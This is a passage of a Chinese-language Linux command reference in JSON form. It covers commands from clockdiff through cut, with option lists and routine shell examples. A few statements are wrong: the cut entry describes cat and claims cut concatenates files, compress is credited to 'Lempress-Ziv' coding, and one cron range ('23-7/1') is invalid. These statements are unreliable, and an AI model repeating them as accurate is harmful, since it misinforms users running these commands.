程序正是使用时间戳来测算目的主机和本地主机的系统时间差。\n\n### 选项  \n\n```\n-o：使用IP时间戳选项来测量系统时间差。时间戳只用3个。\n-o1：使用IP时间戳选项来测量系统时间差。用4个时间戳。如果-o和-o1都没有设置，那么就是用ICMP时间戳来测试系统时间差。\n```\n\n### 实例  \n\n```\nlixi@lixi-desktop:~$ ping -T tsandaddr www.ustc.edu.cn -c 1\nPING www.ustc.edu.cn (202.38.64.9) 56(124) bytes of data.\n64 bytes from 202.38.64.9: icmp_seq\u003d1 ttl\u003d62 time\u003d0.823 ms\nTS:     lixi-desktop.local (210.45.74.25)    12522473 absolute\n    210.45.74.1    -251\n    local-gw.ustc.edu.cn (202.38.64.126)    248\n    202.38.64.9    -857514\nUnrecorded hops: 3\n\n--- www.ustc.edu.cn ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev \u003d 0.823/0.823/0.823/0.000 ms\n```\n\n首先由上面的得出在RRT不大的时候，几个ICMP时间戳的关系。本地主机和202.38.64.9之间的时间差约为：-857514+248-251\u003d-857517。分别用-o（IP选项中时间戳）和不带选项（ICMP路由时间戳）上述路由的系统时间进行测试。得到的结果：\n\n```\nlixi@lixi-desktop:~# ./clockdiff -o 202.38.64.9  \n..................................................\nhost\u003d202.38.64.9 rtt\u003d1(0)ms/1ms delta\u003d-857517ms/-857517ms Wed Dec 17 11:28:30 2008\n```\n\n```\nlixi@lixi-desktop:~# ./clockdiff 202.38.64.9\n.\nhost\u003d202.38.64.9 rtt\u003d750(187)ms/0ms delta\u003d-857517ms/-857517ms Wed Dec 17 11:28:35 2008\n```\n\n两种方法测试的都比较准确。\n\n```\nlixi@lixi-desktop:~#./clockdiff gigagate1.Princeton.EDU\n..................................................\nhost\u003dgigagate1.Princeton.EDU rtt\u003d307(21)ms/271ms delta\u003d-5ms/-5ms Wed Dec 17 11:50:16 2008\n```\n\n上面是测试一个RTT较大的目的主机和本地主机的系统时间差。不过在使用clockdiff的时候，需要一点运气，因为很多路由会忽略ICMP或IP时间戳。\n\n\n"},{"name":"cmp","categoryId":6,"data":"cmp\n\u003d\u003d\u003d\n\n比较两个文件是否有差异\n\n## 补充说明\n\n**cmp命令** 用来比较两个文件是否有差异。当相互比较的两个文件完全一样时，则该指令不会显示任何信息。若发现有差异，预设会标示出第一个不通之处的字符和列数编号。若不指定任何文件名称或是所给予的文件名为“-”，则cmp指令会从标准输入设备读取数据。\n\n### 语法  \n\n```\ncmp(选项)(参数)\n```\n\n### 选项  \n\n```\n-c或--print-chars：除了标明差异处的十进制字码之外，一并显示该字符所对应字符；\n-i\u003c字符数目\u003e或--ignore-initial\u003d\u003c字符数目\u003e：指定一个数目；\n-l或——verbose：标示出所有不一样的地方；\n-s或--quiet或——silent：不显示错误信息；\n-v或——version：显示版本信息；\n--help：在线帮助。\n```\n\n### 参数  \n\n目录：比较两个文件的差异。\n\n### 实例  \n\n使用cmp命令比较文件\"testfile\"和文件\"testfile1\"两个文件，则输入下面的命令：\n\n```\ncmp testfile testfile1            #比较两个指定的文件\n```\n\n在上述指令执行之前，使用cat命令查看两个指定的文件内容，如下所示：\n\n```\ncat testfile                    #查看文件内容  \nAbsncn 50                       #显示文件“testfile”  \nAsldssja 60  \nJslkadjls 85 \n\ncat testfile1                   #查看文件内容  \nAbsncn 50                       #显示文件“testfile1”  \nAsldssjE 62  \nJslkadjls 85  \n```\n\n然后，再执行cmp命令，并返回比较结果，具体如下所示：\n\n```\ncmp testfile testfile1       #比较两个文件  \ntestfile testfile1           #有差异：第8字节，第2行  \n```\n\n注意：在比较结果中，只能够显示第一比较结果。\n\n\n"},{"name":"col","categoryId":1,"data":"col\n\u003d\u003d\u003d\n\n过滤控制字符\n\n## 补充说明\n\n**col命令** 是一个标准输入文本过滤器，它从标注输入设备读取文本内容，并把内容显示到标注输出设备。在许多UNIX说明文件里，都有RLF控制字符。当我们运用shell特殊字符`\u003e`和`\u003e\u003e`，把说明文件的内容输出成纯文本文件时，控制字符会变成乱码，col命令则能有效滤除这些控制字符。\n\n### 语法  \n\n```\ncol(选项)\n```\n\n### 选项  \n\n```\n-b：过滤掉所有的控制字符，包括RLF和HRLF；\n-f：滤掉RLF字符，但允许将HRLF字符呈现出来；\n-x：以多个空格字符来表示跳格字符；\n-l\u003c缓冲区列数\u003e：预设的内存缓冲区有128列，用户可以自行指定缓冲区的大小。\n```\n\n\n"},{"name":"colrm","categoryId":1,"data":"colrm\n\u003d\u003d\u003d\n\n删除文件中的指定列\n\n## 补充说明\n\n**colrm命令** 用于删除文件中的指定列。colrm命令从标准输入设备读取书记，转而输出到标准输出设备。如果不加任何参数，则colrm命令不会过滤任何一行。\n\n### 语法  \n\n```\ncolrm(参数)\n```\n\n### 参数  \n\n*   起始列号：指定要删除的指定列；\n*   结尾列号：指定要删除的结尾列。\n\n\n"},{"name":"comm","categoryId":1,"data":"comm\n\u003d\u003d\u003d\n\n两个文件之间的比较\n\n## 补充说明\n\n**comm命令** 可以用于两个文件之间的比较，它有一些选项可以用来调整输出，以便执行交集、求差、以及差集操作。\n\n*   交集：打印出两个文件所共有的行。\n*   求差：打印出指定文件所包含的且不相同的行。\n*   差集：打印出包含在一个文件中，但不包含在其他指定文件中的行。\n\n### 语法  \n\n```\ncomm(选项)(参数)\n```\n\n### 选项  \n\n```\n-1：不显示在第一个文件出现的内容；\n-2：不显示在第二个文件中出现的内容；\n-3：不显示同时在两个文件中都出现的内容。\n```\n\n### 参数  \n\n*   文件1：指定要比较的第一个有序文件；\n*   文件2：指定要比较的第二个有序文件。\n\n### 实例  \n\n```\n[root@localhost text]# cat aaa.txt \naaa\nbbb\nccc\nddd\neee\n111\n222\n```\n\n```\n[root@localhost text]# cat bbb.txt \nbbb\nccc\naaa\nhhh\nttt\njjj\n```\n\n```\n[root@localhost text]# comm aaa.txt bbb.txt \naaa\n                bbb\n                ccc\n        aaa\nddd\neee\n111\n222\n        hhh\n        ttt\n        jjj\n第一列  第二列  第三列\n```\n\n输出的第一列只包含在aaa.txt中出现的行，第二列包含在bbb.txt中出现的行，第三列包含在aaa.txt和bbb.txt中相同的行。各列是以制表符（\\t）作为定界符。\n\n **交集** \n\n打印两个文件的交集，需要删除第一列和第二列：\n\n```\n[root@localhost text]# comm aaa.txt bbb.txt -1 -2\nbbb\nccc\n```\n\n **求差** \n\n打印出两个文件中不相同的行，需要删除第三列：\n\n```\n[root@localhost text]# comm aaa.txt bbb.txt -3 | sed \u0027s/^\\t//\u0027\naaa\naaa\nddd\neee\n111\n222\nhhh\nttt\njjj\n```\n\nsed \u0027s/^\\t//\u0027 是将制表符（\\t）删除，以便把两列合并成一列。\n\n **差集** \n\n通过删除不需要的列，可以得到aaa.txt和bbb.txt的差集：\n\naaa.txt的差集\n\n```\n[root@localhost text]# comm aaa.txt bbb.txt -2 -3\naaa\nddd\neee\n111\n222\n```\n\nbbb.txt的差集\n\n```\n[root@localhost text]# comm aaa.txt bbb.txt -1 -3\naaa\nhhh\nttt\njjj\n```\n\n\n"},{"name":"command","categoryId":0,"data":"command\n\u003d\u003d\u003d\n\n调用并执行指定的命令\n\n## 补充说明\n\n**command命令** 调用指定的指令并执行，命令执行时不查询shell函数。command命令只能够执行shell内部的命令。\n\n### 语法  \n\n```\ncommand(参数)\n```\n\n### 参数  \n\n指令：需要调用的指令及参数。\n\n### 实例  \n\n使用command命令调用执行`echo Linux`，输入如下命令：\n\n```\ncommand echo Linux            #调用执行shell内部指令\n```\n\n上面的命令执行后，将调用执行命令`echo Linux`，其执行结果如下：\n\n```\nLinux\n```\n\n\n"},{"name":"compress","categoryId":10,"data":"compress\n\u003d\u003d\u003d\n\n使用Lempress-Ziv编码压缩数据文件\n\n## 补充说明\n\n**compress命令** 使用“Lempress-Ziv”编码压缩数据文件。compress是个历史悠久的压缩程序，文件经它压缩后，其名称后面会多出\".Z\"的扩展名。当要解压缩时，可执行uncompress指令。事实上uncompress是指向compress的符号连接，因此不论是压缩或解压缩，都可通过compress指令单独完成。\n\n### 语法  \n\n```\ncompress(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：不提示用户，强制覆盖掉目标文件；\n-c：将结果送到标准输出，无文件被改变；\n-r：递归的操作方式；\n-b\u003c压缩效率\u003e：压缩效率是一个介于9~16的数值，预设值为\"16\"，指定愈大的数值，压缩效率就愈高；\n-d：对文件进行解压缩而非压缩；\n-v：显示指令执行过程；\n-V：显示指令版本及程序预设值。\n```\n\n### 参数  \n\n文件：指定要压缩的文件列表。\n\n### 实例  \n\n将`/etc/man.config`复到`/tmp` ，并加以压缩\n\n```\n[root@localhost ~]# cd /tmp\n[root@localhost tmp]# cp /etc/man.config .\n[root@localhost tmp]# compress man.config\n[root@localhost tmp]# ls -l\n```\n\n```\n-rw-r--r-- 1 root root 2605 Jul 27 11:43 man.config.Z\n```\n\n将刚刚的压缩档解开\n\n```\n[root@localhost tmp]# compress -d man.config.Z\n```\n\n将 man.config 压缩成另外一个文件来备份\n\n```\n[root@localhost tmp]# compress -c man.config \u003e man.config.back.Z\n[root@localhost tmp]# ll man.config*\n```\n\n```\n-rw-r--r-- 1 root root 4506 Jul 27 11:43 man.config\n-rw-r--r-- 1 root root 2605 Jul 27 11:46 man.config.back.Z\n```\n\n这个`-c`的选项比较有趣！会将压缩过程的资料输出到屏幕上，而不是写入成为file.Z文件。所以，我们可以透过资料流重导向的方法将资料输出成为另一个档名。\n\n\n"},{"name":"consoletype","categoryId":0,"data":"consoletype\n\u003d\u003d\u003d\n\n输出已连接的终端类型\n\n## 补充说明\n\n**consoletype命令** 用于打印已连接的终端类型到标准输出，并能够检查已连接的终端是当前终端还是虚拟终端。\n\n### 语法  \n\n```\nconsoletype\n```\n\n### 实例  \n\n```\n[root@localhost ~]# consoletype\npty\n```\n\n\n"},{"name":"convertquota","categoryId":0,"data":"convertquota\n\u003d\u003d\u003d\n\n把老的配额文件转换为新的格式\n\n## 补充说明\n\n**convertquota命令** 用于将老的磁盘额数据文件（“quota.user”和“quota.group”）转换为新格式的文件（“quota.user”和“quota.group”）。\n\n### 语法  \n\n```\nconvertquota(选项)(参数)\n```\n\n### 选项  \n\n```\n-u：仅转换用户磁盘配额数据文件；\n-g：仅转换组磁盘配额数据文件；\n-f：将老的磁盘配额文件转换为新的格式；\n-e：将新的文件格式从大字节序换为小字节序。\n```\n\n### 参数  \n\n文件系统：指定要转换磁盘配额数据文件格式的文件系统（硬盘分区）。\n\n### 实例  \n\n使用convertquota指令转换指定文件系统`/data`的磁盘配额数据文件。在命令行中输入下面的命令：\n\n```\nconvertquota -u /data     //转换文件系统\"/data\"上的用户磁盘配额文件\n```\n\n\n"},{"name":"cp","categoryId":6,"data":"cp\n\u003d\u003d\u003d\n\n将源文件或目录复制到目标文件或目录中\n\n## 补充说明\n\n**cp命令** 用来将一个或多个源文件或者目录复制到指定的目的文件或目录。它可以将单个源文件复制成一个指定文件名的具体的文件或一个已经存在的目录下。cp命令还支持同时复制多个文件，当一次复制多个文件时，目标文件参数必须是一个已经存在的目录，否则将出现错误。\n\n### 语法  \n\n```\ncp(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：此参数的效果和同时指定\"-dpR\"参数相同；\n-d：当复制符号连接时，把目标文件或目录也建立为符号连接，并指向与源文件或目录连接的原始文件或目录；\n-f：强行复制文件或目录，不论目标文件或目录是否已存在；\n-i：覆盖既有文件之前先询问用户；\n-l：对源文件建立硬连接，而非复制文件；\n-p：保留源文件或目录的属性；\n-R/r：递归处理，将指定目录下的所有文件与子目录一并处理；\n-s：对源文件建立符号连接，而非复制文件；\n-u：使用这项参数后只会在源文件的更改时间较目标文件更新时或是名称相互对应的目标文件并不存在时，才复制文件；\n-S：在备份文件时，用指定的后缀“SUFFIX”代替文件的默认后缀；\n-b：覆盖已存在的文件目标前将目标文件备份；\n-v：详细显示命令执行的操作。\n```\n\n### 参数  \n\n*   源文件：制定源文件列表。默认情况下，cp命令不能复制目录，如果要复制目录，则必须使用`-R`选项；\n*   目标文件：指定目标文件。当“源文件”为多个文件时，要求“目标文件”为指定的目录。\n\n### 实例  \n\n如果把一个文件复制到一个目标文件中，而目标文件已经存在，那么，该目标文件的内容将被破坏。此命令中所有参数既可以是绝对路径名，也可以是相对路径名。通常会用到点`.`或点点`..`的形式。例如，下面的命令将指定文件复制到当前目录下：\n\n```\ncp ../mary/homework/assign .\n```\n\n所有目标文件指定的目录必须是己经存在的，cp命令不能创建目录。如果没有文件复制的权限，则系统会显示出错信息。\n\n将文件file复制到目录`/usr/men/tmp`下，并改名为file1\n\n```\ncp file /usr/men/tmp/file1\n```\n\n将目录`/usr/men`下的所有文件及其子目录复制到目录`/usr/zh`中\n\n```\ncp -r /usr/men /usr/zh\n```\n\n交互式地将目录`/usr/men`中的以m打头的所有.c文件复制到目录`/usr/zh`中\n\n```\ncp -i /usr/men m*.c /usr/zh\n```\n\n我们在Linux下使用cp命令复制文件时候，有时候会需要覆盖一些同名文件，覆盖文件的时候都会有提示：需要不停的按Y来确定执行覆盖。文件数量不多还好，但是要是几百个估计按Y都要吐血了，于是折腾来半天总结了一个方法：\n\n```\ncp aaa/* /bbb\n复制目录aaa下所有到/bbb目录下，这时如果/bbb目录下有和aaa同名的文件，需要按Y来确认并且会略过aaa目录下的子目录。\n\ncp -r aaa/* /bbb\n这次依然需要按Y来确认操作，但是没有忽略子目录。\n\ncp -r -a aaa/* /bbb\n依然需要按Y来确认操作，并且把aaa目录以及子目录和文件属性也传递到了/bbb。\n\n\\cp -r -a aaa/* /bbb\n成功，没有提示按Y、传递了目录属性、没有略过目录。\n```\n\n\n"},{"name":"cpio","categoryId":10,"data":"cpio\n\u003d\u003d\u003d\n\n用来建立、还原备份档的工具程序\n\n## 补充说明\n\n**cpio命令** 主要是用来建立或者还原备份档的工具程序，cpio命令可以复制文件到归档包中，或者从归档包中复制文件。\n\n### 语法  \n\n```\ncpio(选项)\n```\n\n### 选项  \n\n```\n-0或--null：接受新增列控制字符，通常配合find指令的“-print0”参数使用；\n-a或--rest-access-time：重新设置文件的存取时间；\n-A或--append：附加到已存在的备份文档中，且这个备份文档必须存放在磁盘上，而不能放置于磁带机里；\n-b或--awap：此参数的效果和同时指定“-ss”参数相同；\n-B：将输入/输出的区块大小改成5210Bytes；\n-c：使用旧ASCII备份格式；\n-C\u003c区块大小\u003e或--io-size\u003d\u003c区块大小\u003e：设置输入/输出的区块大小，单位是Byte；\n-d或--make-directories：如有需要cpio会自行建立目录；\n-E\u003c范本文件\u003e或--pattern-file\u003d\u003c范本文件\u003e：指定范本文件，其内含有一个或多个范本样式，让cpio解开符合范本条件的文件，格式为每列一个范本样式；\n-f或--nonmatching：让cpio解开所有不符合范本条件的文件；\n-F\u003c备份档\u003e或--file\u003d\u003c备份档\u003e：指定备份档的名称，用来取代标准输入或输出，也能借此通过网络使用另一台主机的保存设备存取备份档；\n-H\u003c备份格式\u003e：指定备份时欲使用的文件格式；\n-i或--extract：执行copy-in模式，还原备份档；\n-l\u003c备份档\u003e：指定备份档的名称，用来取代标准输入，也能借此通过网络使用另一台主机的保存设备读取备份档；\n-k：此参数将忽略不予处理，仅负责解决cpio不同版本间的兼容性问题；\n-l或--link：以硬连接的方式取代复制文件，可在copy-pass模式下运用；\n-L或--dereference：不建立符号连接，直接复制该连接所指向的原始文件；\n-m或preserve-modification-time：不去更改文件的更改时间；\n-M\u003c回传信息\u003e或--message\u003d\u003c回传信息\u003e：设置更换保存媒体的信息；\n-n或--numeric-uid-gid：使用“-tv”参数列出备份档的内容时，若再加上参数“-n”，则会以用户识别和群组识别码替代拥有者和群组名称列出文件清单；\n-o或--create：执行copy-out模式，建立备份档；\n-O\u003c备份档\u003e：指定备份档的名称，用来取代标准输出，也能借此通过网络使用另一台主机的保存设备存放备份档；\n-p或--pass-through：执行copy-pass模式，略过备份步骤，直接将文件复制到目的目录；\n-r或--rename：当有文件名称需要更改时，采用互动模式；\n-R\u003c拥有者\u003e\u003c:/.\u003e\u003c所属群组\u003e或----owner\u003c拥有者\u003e\u003c:/.\u003e\u003c所属群组\u003e   在copy-in模式还原备份档，或copy-pass模式复制文件时，可指定这些备份，复制的文件的拥有者与所属群组；\n-s或--swap-bytes：交换每队字节的内容；\n-S或--swap-halfwords：交换每半个字节的内容；\n-t或--list：将输入的内容呈现出来；\n-u或--unconditional：置换所有文件，不论日期时间的新旧与否，皆不予询问而直接覆盖；\n-v或--verbose：详细显示指令的执行过程；\n-V或--dot：执行指令时。在每个文件的执行程序前面加上“.”号；\n--block-size\u003d\u003c区块大小\u003e：设置输入/输出的区块大小，假如设置数值为5，则区块大小为2500，若设置成10，则区块大小为5120，以此类推；\n--force-local：强制将备份档存放在本地主机；\n--help：在线帮助；\n--no-absolute-filenames：使用相对路径建立文件名称；\n--no-preserve-owner：不保留文件的拥有者，谁解开了备份档，那些文件就归谁所有；\n-only-verify-crc：当备份档采用CRC备份格式时，可使用这项参数检查备份档内的每个文件是否正确无误；\n--quiet：不显示复制了多少区块；\n--sparse：倘若一个文件内含有大量的连续0字节，则将此文件存在稀疏文件；\n--version：显示版本信息。\n```\n\n### 实例  \n\n **将`/etc`下的所有普通文件都备份到`/opt/etc.cpio`，使用以下命令：** \n\n```\nfind /etc –type f | cpio –ocvB \u003e/opt/etc.cpio\n```\n\n **将系统上所有资料备份到磁带机内，使用以下命令：** \n\n```\nfind / -print | cpio -covB \u003e /dev/st0\n```\n\n这里的`/dev/st0`是磁带的设备名，代表SCSI磁带机。\n\n **查看上例磁带机上备份的文件，使用以下命令：** \n\n```\ncpio  -icdvt \u003c /dev/st0 \u003e /tmp/st_content\n```\n\n有时可能因为备份的文件过多，一个屏幕无法显示完毕，此时我们利用下面命令，让磁带机的文件信息输出到文件。\n\n **将示例1中的备份包还原到相应的位置，如果有相同文件进行覆盖，使用以下命令：** \n\n```\ncpio –icduv \u003c /opt/etc.cpio\n```\n\n注意，cpio恢复的路径，如果cpio在打包备份的时候用的是绝对路径，那么在恢复的时候会自动恢复到这些绝对路径下，本例就会将备份文件全部还原到/etc路径下对应的目录中。同理，如果在打包备份用的是相对路径，还原时也将恢复到相对路径下。\n\n通过上面的示例，可以看出，cpio无法直接读取文件，它需要每个文件或者目录的完整路径名才能识别读取，而find命令的输出刚好做到了这点，因此，cpio命令一般和find命令配合使用。其实，上面的示例我们已经看到了它们的组合用法。\n\n\n"},{"name":"crontab","categoryId":4,"data":"crontab\n\u003d\u003d\u003d\n\n提交和管理用户的需要周期性执行的任务\n\n## 补充说明\n\n**crontab命令** 被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。\n\n### 语法  \n\n```\ncrontab(选项)(参数)\n```\n\n### 选项  \n\n```\n-e：编辑该用户的计时器设置；\n-l：列出该用户的计时器设置；\n-r：删除该用户的计时器设置；\n-u\u003c用户名称\u003e：指定要设定计时器的用户名称。\n```\n\n### 参数  \n\ncrontab文件：指定包含待执行任务的crontab文件。\n\n### 知识扩展  \n\nLinux下的任务调度分为两类： **系统任务调度** 和 **用户任务调度** 。\n\n **系统任务调度：** 系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在`/etc`目录下有一个crontab文件，这个就是系统任务调度的配置文件。\n\n`/etc/crontab`文件包括下面几行：\n\n```\nSHELL\u003d/bin/bash\nPATH\u003d/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO\u003d\"\"HOME\u003d/\n\n# run-parts\n51 * * * * root run-parts /etc/cron.hourly\n24 7 * * * root run-parts /etc/cron.daily\n22 4 * * 0 root run-parts /etc/cron.weekly\n42 4 1 * * root run-parts /etc/cron.monthly\n```\n\n前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。\n\n **用户任务调度：** 用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab文件都被保存在`/var/spool/cron`目录中。其文件名与用户名一致，使用者权限文件如下：\n\n```\n/etc/cron.deny     该文件中所列用户不允许使用crontab命令\n/etc/cron.allow    该文件中所列用户允许使用crontab命令\n/var/spool/cron/   所有用户crontab文件存放的目录,以用户名命名\n```\n\ncrontab文件的含义：用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：\n\n```\nminute   hour   day   month   week   command     顺序：分 时 日 月 周\n```\n\n其中：\n\n*   minute： 表示分钟，可以是从0到59之间的任何整数。\n*   hour：表示小时，可以是从0到23之间的任何整数。\n*   day：表示日期，可以是从1到31之间的任何整数。\n*   month：表示月份，可以是从1到12之间的任何整数。\n*   week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。\n*   command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。\n\n在以上各个字段中，还可以使用以下特殊字符：\n\n*   星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。\n*   逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”\n*   中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”\n*   正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。\n\n **crond服务** \n\n```\n/sbin/service crond start    //启动服务\n/sbin/service crond stop     //关闭服务\n/sbin/service crond restart  //重启服务\n/sbin/service crond reload   //重新载入配置\n```\n\n查看crontab服务状态：\n\n```\nservice crond status\n```\n\n手动启动crontab服务：\n\n```\nservice crond start\n```\n\n查看crontab服务是否已设置为开机启动，执行命令：\n\n```\nntsysv\n```\n\n加入开机自动启动：\n\n```\nchkconfig –level 35 crond on\n```\n\n### 实例  \n\n每1分钟执行一次command\n\n```\n* * * * * command\n```\n\n每小时的第3和第15分钟执行\n\n```\n3,15 * * * * command\n```\n\n在上午8点到11点的第3和第15分钟执行\n\n```\n3,15 8-11 * * * command\n```\n\n每隔两天的上午8点到11点的第3和第15分钟执行\n\n```\n3,15 8-11 */2 * * command\n```\n\n每个星期一的上午8点到11点的第3和第15分钟执行\n\n```\n3,15 8-11 * * 1 command\n```\n\n每晚的21:30重启smb \n\n```\n30 21 * * * /etc/init.d/smb restart\n```\n\n每月1、10、22日的4 : 45重启smb \n\n```\n45 4 1,10,22 * * /etc/init.d/smb restart\n```\n\n每周六、周日的1:10重启smb\n\n```\n10 1 * * 6,0 /etc/init.d/smb restart\n```\n\n每天18 : 00至23 : 00之间每隔30分钟重启smb \n\n```\n0,30 18-23 * * * /etc/init.d/smb restart\n```\n\n每星期六的晚上11:00 pm重启smb \n\n```\n0 23 * * 6 /etc/init.d/smb restart\n```\n\n每一小时重启smb \n\n```\n* */1 * * * /etc/init.d/smb restart\n```\n\n晚上11点到早上7点之间，每隔一小时重启smb\n\n```\n* 23-7/1 * * * /etc/init.d/smb restart\n```\n\n每月的4号与每周一到周三的11点重启smb \n\n```\n0 11 4 * mon-wed /etc/init.d/smb restart\n```\n\n一月一号的4点重启smb\n\n```\n0 4 1 jan * /etc/init.d/smb restart\n```\n\n每小时执行`/etc/cron.hourly`目录内的脚本\n\n```\n01 * * * * root run-parts /etc/cron.hourly\n```\n\n\n"},{"name":"csplit","categoryId":1,"data":"csplit\n\u003d\u003d\u003d\n\n将一个大文件分割成小的碎片文件\n\n## 补充说明\n\n**csplit命令** 用于将一个大文件分割成小的碎片，并且将分割后的每个碎片保存成一个文件。碎片文件的命名类似“xx00”，“xx01”。csplit命令是split的一个变体，split只能够根据文件大小或行数来分割，但csplit能够根据文件本身特点来分割文件。\n\n### 语法  \n\n```\ncsplit(选项)(参数)\n```\n\n### 选项  \n\n```\n-b\u003c输出格式\u003e或--suffix-format\u003d\u003c输出格式\u003e：预设的输出格式其文件名称为xx00，xx01等，用户可以通过改变\u003c输出格式\u003e来改变输出的文件名；\n-f\u003c输出字首字符串\u003e或--prefix\u003d\u003c输出字首字符串\u003e：预设的输出字首字符串其文件名为xx00，xx01等，如果制定输出字首字符串为“hello”，则输出的文件名称会变成hello00，hello、01......\n-k或--keep-files：保留文件，就算发生错误或中断执行，与不能删除已经输出保存的文件；\n-n\u003c输出文件名位数\u003e或--digits\u003d\u003c输出文件名位数\u003e：预设的输出文件名位数其文件名称为xx00，xx01......如果用户指定输出文件名位数为“3”，则输出的文件名称会变成xx000，xx001等；\n-q或-s或--quiet或——silent：不显示指令执行过程；\n-z或--elide-empty-files：删除长度为0 Byte文件。\n```\n\n### 参数  \n\n*   文件：指定要分割的原文件；\n*   模式：指定要分割文件时的匹配模式。\n\n### 实例  \n\n示例测试文件 server.log\n\n```\ncat server.log\nSERVER-1\n[con] 10.10.10.1 suc\n[con] 10.10.10.2 fai\n[dis] 10.10.10.3 pen\n[con] 10.10.10.4 suc\nSERVER-2\n[con] 10.10.10.5 suc\n[con] 10.10.10.6 fai\n[dis] 10.10.10.7 pen\n[con] 10.10.10.8 suc\nSERVER-3\n[con] 10.10.10.9 suc\n[con] 10.10.10.10 fai\n[dis] 10.10.10.11 pen\n[con] 10.10.10.12 suc\n```\n\n需要将server.log分割成server1.log、server2.log、server3.log，这些文件的内容分别取自原文件中不同的SERVER部分：\n\n```\n[root@localhost split]# csplit server.log /SERVER/ -n2 -s {*} -f server -b \"%02d.log\"; rm server00.log\n[root@localhost split]# ls\nserver01.log  server02.log  server03.log  server.log\n```\n\n **命令详细说明：** \n\n```\n/[正则表达式]/   #匹配文本样式，比如/SERVER/，从第一行到包含SERVER的匹配行。\n{*}     #表示根据匹配重复执行分割，直到文件尾停止，使用{整数}的形式指定分割执行的次数。\n-s      #静默模式，不打印其他信息。\n-n      #指定分割后的文件名后缀的数字个数。比如01、02、03等。\n-f      #指定分割后的文件名前缀。\n-b      #指定后缀格式。比如%02d.log，类似于C语言中的printf参数格式。\nrm server00.log    #是删除第一个文件，因为分割后的的第一个文件没有内容，匹配的单词就位于文件的第一行中。\n```\n\n\n"},{"name":"cupsdisable","categoryId":0,"data":"cupsdisable\n\u003d\u003d\u003d\n\n停止指定的打印机\n\n## 补充说明\n\n**cupsdisable命令** 用于停止指定的打印机。\n\n### 语法  \n\n```\ncupsdisable(选项)(参数)\n```\n\n### 选项  \n\n```\n-E：当连接到服务器时强制使用加密；\n-U：指定连接服务器时使用的用户名；\n-u：指定打印任务所属的用户；\n-c：取消指定打印机的所有打印任务；\n-h：指定连接的服务器名和端口号；\n-r：停止打印机的原因。\n```\n\n### 参数  \n\n目标：指定目标打印机。\n\n\n"},{"name":"cupsenable","categoryId":0,"data":"cupsenable\n\u003d\u003d\u003d\n\n启动指定的打印机\n\n## 补充说明\n\n**cupsenable命令** 用于启动指定的打印机。\n\n### 语法  \n\n```\ncupsenable(选项)(参数)\n```\n\n### 选项  \n\n```\n-E：当连接到服务器时强制使用加密；\n-U：指定连接服务器时使用的用户名；\n-u：指定打印任务所属的用户；\n-h：指定连接的服务器名和端口号；\n```\n\n### 参数  \n\n目标：指定目标打印机。\n\n\n"},{"name":"cut","categoryId":6,"data":"cut\n\u003d\u003d\u003d\n\n连接文件并打印到标准输出设备上\n\n## 补充说明\n\n**cut命令** 用来显示行中的指定部分，删除文件中指定字段。cut经常用来显示文件的内容，类似于下的type命令。\n\n说明：该命令有两项功能，其一是用来显示文件的内容，它依次读取由参数file所指 明的文件，将它们的内容输出到标准输出上；其二是连接两个或多个文件，如`cut fl f2 \u003e f3`将把文件fl和几的内容合并起来，然后通过输出重定向符“\u003e”的作用，将它们放入文件f3中。\n\n当文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用more等命令分屏显示。为了控制滚屏，可以按Ctrl+S键，停止滚屏；按Ctrl+Q键可以恢复滚屏。按Ctrl+C（中断）键可以终止该命令的执行，并且返回Shell提示符状态。\n\n### 语法  \n\n```\ncut(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：仅显示行中指定直接范围的内容；\n-c：仅显示行中指定范围的字符；\n-d：指定字段的分隔符，默认的字段分隔符为“TAB”；\n-f：显示指定字段的内容；\n-n：与“-b”选项连用，不分割多字节字符；\n--complement：补足被选择的字节、字符或字段；\n--out-delimiter\u003d\u003c字段分隔符\u003e：指定输出内容是的字段分割符；\n--help：显示指令的帮助信息；\n--version：显示指令的版本信息。\n```\n\n### 参数  \n\n文件：指定要进行内容过滤的文件。\n\n### 实例  \n\n例如有一个学生报表信息，包含No、Name、Mark、Percent：\n\n```\n[root@localhost text]# cat test.txt \nNo Name Mark Percent\n01 tom 69 91\n02 jack 71 87\n03 alex 68 98\n\n```\n\n使用  **-f**  选项提取指定字段：\n\n```\n[root@localhost text]# cut -f 1 test.txt \nNo\n01\n02\n03\n```\n\n```\n[root@localhost text]# cut -f2,3 test.txt \nName Mark\ntom 69\njack 71\nalex 68\n\n```\n\n **--complement**  选项提取指定字段之外的列（打印除了第二列之外的列）：\n\n```\n[root@localhost text]# cut -f2 --complement test.txt \nNo Mark Percent\n01 69 91\n02 71 87\n03 68 98\n\n```\n\n使用  **-d**  选项指定字段分隔符：\n\n```\n[root@localhost text]# cat test2.txt \nNo;Name;Mark;Percent\n01;tom;69;91\n02;jack;71;87\n03;alex;68;98\n```\n\n```\n[root@localhost text]# cut -f2 